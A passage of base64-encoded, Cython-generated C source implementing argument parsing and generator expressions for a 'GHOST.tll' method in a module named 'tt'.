YmplY3QgKl9fcHl4X3IgPSAwO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgidGxsICh3cmFwcGVyKSIsIDApO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7XG4gICNlbHNlXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7XG4gICNlbmRpZlxuICAjZW5kaWZcbiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7XG4gIHtcbiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZWxmLDB9O1xuICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwO1xuICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgODIsIF9fcHl4X0wzX2Vycm9yKVxuICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHtcbiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHtcbiAgICAgICAgY2FzZSAgMTpcbiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCA4MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgY2FzZSAgMDogYnJlYWs7XG4gICAgICAgIGRlZmF1bHQ6IGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgICB9XG4gICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzO1xuICAgICAgaWYgKF9fUHl4X1BhcnNlS2V5d29yZHMoX19weXhfa3dkcywgX19weXhfa3d2YWx1ZXMsIF9fcHl4X3B5YXJnbmFtZXMsIDAsIHZhbHVlcywga3dkX3Bvc19hcmdzLCBfX3B5eF9rd2RzX2xlbiwgInRsbCIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgODIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDE7IGkrKykge1xuICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoInRsbCIsIDEsIDEsIDEsIGkpOyBfX1BZWF9FUlIoMCwgODIsIF9fcHl4X0wzX2Vycm9yKSB9XG4gICAgICB9XG4gICAgfSBlbHNlIGlmICh1bmxpa2VseShfX3B5eF9uYXJncyAhPSAxKSkge1xuICAgICAgZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjtcbiAgICB9IGVsc2Uge1xuICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgODIsIF9fcHl4X0wzX2Vycm9yKVxuICAgIH1cbiAgICBfX3B5eF92X3NlbGYgPSB2YWx1ZXNbMF07XG4gIH1cbiAgZ290byBfX3B5eF9MNl9za2lwO1xuICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7XG4gIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJ0bGwiLCAxLCAxLCAxLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCA4MiwgX19weXhfTDNfZXJyb3IpXG4gIF9fcHl4X0w2X3NraXA6O1xuICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lO1xuICBfX3B5eF9MM19lcnJvcjo7XG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dC5HSE9TVC50bGwiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBOVUxMO1xuICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7XG4gIF9fcHl4X3IgPSBfX3B5eF9wZl8ydHRfNUdIT1NUXzEwdGxsKF9fcHl4X3NlbGYsIF9fcHl4X3Zfc2VsZik7XG5cbiAgXG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8ydHRfNUdIT1NUXzN0bGxfMmdlbmVyYXRvcihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKTsgXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0dF81R0hPU1RfM3RsbF9nZW5leHByKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfZ2VuZXhwcl9hcmdfMCkge1xuICBzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICpfX3B5eF9jdXJfc2NvcGU7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZ2VuZXhwciIsIDApO1xuICBfX3B5eF9jdXJfc2NvcGUgPSAoc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqKV9fcHl4X3RwX25ld18ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIE5VTEwpO1xuICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZSkpIHtcbiAgICBfX3B5eF9jdXJfc2NvcGUgPSAoKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKilQeV9Ob25lKTtcbiAgICBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gICAgX19QWVhfRVJSKDAsIDg0LCBfX3B5eF9MMV9lcnJvcilcbiAgfSBlbHNlIHtcbiAgICBfX1B5eF9HT1RSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTtcbiAgfVxuICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X291dGVyX3Njb3BlID0gKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsICopIF9fcHl4X3NlbGY7XG4gIF9fUHl4X0lOQ1JFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X291dGVyX3Njb3BlKTtcbiAgX19QeXhfR0lWRVJFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X291dGVyX3Njb3BlKTtcbiAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wID0gX19weXhfZ2VuZXhwcl9hcmdfMDtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTtcbiAge1xuICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gX19QeXhfR2VuZXJhdG9yX05ldygoX19weXhfY29yb3V0aW5lX2JvZHlfdCkgX19weXhfZ2JfMnR0XzVHSE9TVF8zdGxsXzJnZW5lcmF0b3IsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlswXSksIChQeU9iamVjdCAqKSBfX3B5eF9jdXJfc2NvcGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR0hPU1RfdGxsX2xvY2Fsc19nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdHQpOyBpZiAodW5saWtlbHkoIWdlbikpIF9fUFlYX0VSUigwLCA4NCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfREVDUkVGKF9fcHl4X2N1cl9zY29wZSk7XG4gICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gICAgcmV0dXJuIChQeU9iamVjdCAqKSBnZW47XG4gIH1cblxuICBcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9BZGRUcmFjZWJhY2soInR0LkdIT1NULnRsbC5nZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9ERUNSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8ydHRfNUdIT1NUXzN0bGxfMmdlbmVyYXRvcihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKSBcbntcbiAgc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICopX19weXhfZ2VuZXJhdG9yLT5jbG9zdXJlKTtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKigqX19weXhfdF8yKShQeU9iamVjdCAqKTtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90Xzc7XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImdlbmV4cHIiLCAwKTtcbiAgc3dpdGNoIChfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCkge1xuICAgIGNhc2UgMDogZ290byBfX3B5eF9MM19maXJzdF9ydW47XG4gICAgZGVmYXVsdDogXG4gICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gICAgcmV0dXJuIE5VTEw7XG4gIH1cbiAgX19weXhfTDNfZmlyc3RfcnVuOjtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF9zZW50X3ZhbHVlKSkgX19QWVhfRVJSKDAsIDg0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfciA9IFB5TGlzdF9OZXcoMCk7IGlmICh1bmxpa2VseSghX19weXhfcikpIF9fUFlYX0VSUigwLCA4NCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9yKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB7IF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoIi4wIik7IF9fUFlYX0VSUigwLCA4NCwgX19weXhfTDFfZXJyb3IpIH1cbiAgX19weXhfdF8xID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA4NCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICBfX3B5eF90XzIgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA4NCwgX19weXhfTDFfZXJyb3IpXG4gIGZvciAoOzspIHtcbiAgICB7XG4gICAgICBfX3B5eF90XzMgPSBfX3B5eF90XzIoX19weXhfdF8xKTtcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkge1xuICAgICAgICBQeU9iamVjdCogZXhjX3R5cGUgPSBQeUVycl9PY2N1cnJlZCgpO1xuICAgICAgICBpZiAoZXhjX3R5cGUpIHtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhleGNfdHlwZSwgUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSBfX1BZWF9FUlIoMCwgODQsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgICAgIH1cbiAgICAgICAgYnJlYWs7XG4gICAgICB9XG4gICAgfVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X2kpO1xuICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9pLCBfX3B5eF90XzMpO1xuICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8zKTtcbiAgICBfX3B5eF90XzMgPSAwO1xuICAgIF9fcHl4X3RfNCA9IE5VTEw7XG4gICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jYyk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDg0LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZS0+X19weXhfb3V0ZXJfc2NvcGUtPl9fcHl4X3Zfc2VsZikpIHsgX19QeXhfUmFpc2VDbG9zdXJlTmFtZUVycm9yKCJzZWxmIik7IF9fUFlYX0VSUigwLCA4NCwgX19weXhfTDFfZXJyb3IpIH1cbiAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X2N1cl9zY29wZS0+X19weXhfb3V0ZXJfc2NvcGUtPl9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3l5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgODQsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgIF9fcHl4X3RfNyA9IDE7XG4gICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkge1xuICAgICAgX19weXhfdF80ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF81KTtcbiAgICAgIGFzc2VydChfX3B5eF90XzQpO1xuICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19weXhfdF83ID0gMDtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNCwgX19weXhfdF82fTtcbiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgyLV9fcHl4X3RfNykgfCAoX19weXhfdF83Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDg0LCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoX19QeXhfTGlzdENvbXBfQXBwZW5kKF9fcHl4X3IsIChQeU9iamVjdCopX19weXhfdF8zKSkpIF9fUFlYX0VSUigwLCA4NCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKF9fcHl4X2N1cl9zY29wZSk7XG5cbiAgXG4gIGdvdG8gX19weXhfTDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsgX19weXhfciA9IDA7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpO1xuICBpZiAoX19QeXhfUHlFcnJfT2NjdXJyZWQoKSkge1xuICAgIF9fUHl4X0dlbmVyYXRvcl9SZXBsYWNlX1N0b3BJdGVyYXRpb24oMCk7XG4gICAgX19QeXhfQWRkVHJhY2ViYWNrKCJnZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIH1cbiAgX19weXhfTDA6O1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgI2lmICFDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKF9fcHl4X2dlbmVyYXRvcik7XG4gICNlbmRpZlxuICBfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCA9IC0xO1xuICBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoKFB5T2JqZWN0KilfX3B5eF9nZW5lcmF0b3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X2diXzJ0dF81R0hPU1RfM3RsbF81Z2VuZXJhdG9yMShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKTsgXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0dF81R0hPU1RfM3RsbF8zZ2VuZXhwcihQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzApIHtcbiAgc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqX19weXhfY3VyX3Njb3BlO1xuICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImdlbmV4cHIiLCAwKTtcbiAgX19weXhfY3VyX3Njb3BlID0gKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKilfX3B5eF90cF9uZXdfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLCBOVUxMKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUpKSB7XG4gICAgX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICopUHlfTm9uZSk7XG4gICAgX19QeXhfSU5DUkVGKFB5X05vbmUpO1xuICAgIF9fUFlYX0VSUigwLCA4NSwgX19weXhfTDFfZXJyb3IpXG4gIH0gZWxzZSB7XG4gICAgX19QeXhfR09UUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7XG4gIH1cbiAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZSA9IChzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCAqKSBfX3B5eF9zZWxmO1xuICBfX1B5eF9JTkNSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZSk7XG4gIF9fUHl4X0dJVkVSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZSk7XG4gIF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCA9IF9fcHl4X2dlbmV4cHJfYXJnXzA7XG4gIF9fUHl4X0lOQ1JFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCk7XG4gIHtcbiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IF9fUHl4X0dlbmVyYXRvcl9OZXcoKF9fcHl4X2Nvcm91dGluZV9ib2R5X3QpIF9fcHl4X2diXzJ0dF81R0hPU1RfM3RsbF81Z2VuZXJhdG9yMSwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzFdKSwgKFB5T2JqZWN0ICopIF9fcHl4X2N1cl9zY29wZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HSE9TVF90bGxfbG9jYWxzX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90dCk7IGlmICh1bmxpa2VseSghZ2VuKSkgX19QWVhfRVJSKDAsIDg1LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfY3VyX3Njb3BlKTtcbiAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgICByZXR1cm4gKFB5T2JqZWN0ICopIGdlbjtcbiAgfVxuXG4gIFxuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QudGxsLmdlbmV4cHIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19weXhfciA9IE5VTEw7XG4gIF9fUHl4X0RFQ1JFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X2diXzJ0dF81R0hPU1RfM3RsbF81Z2VuZXJhdG9yMShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKSBcbntcbiAgc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICopX19weXhfZ2VuZXJhdG9yLT5jbG9zdXJlKTtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKigqX19weXhfdF8yKShQeU9iamVjdCAqKTtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfN